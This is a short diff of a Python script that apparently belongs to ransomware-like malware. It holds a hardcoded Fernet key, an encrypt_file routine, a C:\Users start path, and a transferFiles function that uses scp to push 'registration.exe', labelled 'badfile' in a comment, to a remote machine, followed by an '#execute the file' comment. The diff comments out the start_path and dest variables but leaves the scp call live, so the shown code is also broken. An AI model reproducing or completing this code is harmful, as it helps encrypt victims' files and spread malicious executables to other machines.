@@ -4,7 +4,7 @@ import os
 import time
 
 ### VARIABLES ###
-start_path = r"C:\Users"
+# start_path = r"C:\\Users"
 key = "_TjtaRpjApz2rBn4m22iqH6x3wo_3iDE99HQwKwKt4o="
 # initialize the Fernet class
 f = Fernet(key)
@@ -43,7 +43,7 @@ def encrypt_file(filename, key):
 # Transfer
 def transferFiles(user, ipAddress, password):
     #badfile = r"C:\Users\IEUser\Downloads\registration.exe" #local machine
-    dest = r":~\C:\Users\IEUser\Downloads\registration.exe"
+    # dest = r ":~\\C:\\Users\\IEUser\\Downloads\\registration.exe"
     #os.system(scp badFile rf"{user}@{ipAddress}{dest}") #transfer to remote machine
     os.system('scp "registration.exe" rf"{user}@{ipAddress}{dest}"')
     #execute the file
